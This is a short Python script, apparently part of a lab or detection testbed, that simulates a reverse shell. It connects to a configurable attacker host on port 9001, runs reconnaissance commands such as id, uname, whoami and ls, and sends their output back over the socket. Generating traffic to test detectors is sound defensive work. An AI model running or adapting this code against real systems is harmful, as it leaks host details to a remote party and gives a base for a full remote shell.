#!/usr/bin/env python3
"""
Victim script: Python socket reverse shell simulator.
Connects back to the attacker and simulates an interactive shell session.
"""
import socket
import subprocess
import time
import os

ATTACKER_IP = os.environ.get("ATTACKER_IP", "shellsnare-attacker")
PORT = int(os.environ.get("PORT", "9001"))

def run():
    print(f"[*] Python reverse shell connecting to {ATTACKER_IP}:{PORT}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ATTACKER_IP, PORT))
        s.sendall(b"import socket; python shell connected\n")

        # Simulate a few commands
        commands = ["id", "uname -a", "hostname", "whoami", "ls /"]
        for cmd in commands:
            s.sendall(f"$ {cmd}\n".encode())
            result = subprocess.run(
                cmd, shell=True, capture_output=True, timeout=3
            )
            output = result.stdout + result.stderr
            s.sendall(output or b"(no output)\n")
            time.sleep(0.3)

        s.sendall(b"[*] Python reverse shell session complete.\n")
        s.close()
        print("[*] Python reverse shell demo complete.")
    except Exception as e:
        print(f"[!] Connection failed: {e}")

if __name__ == "__main__":
    run()
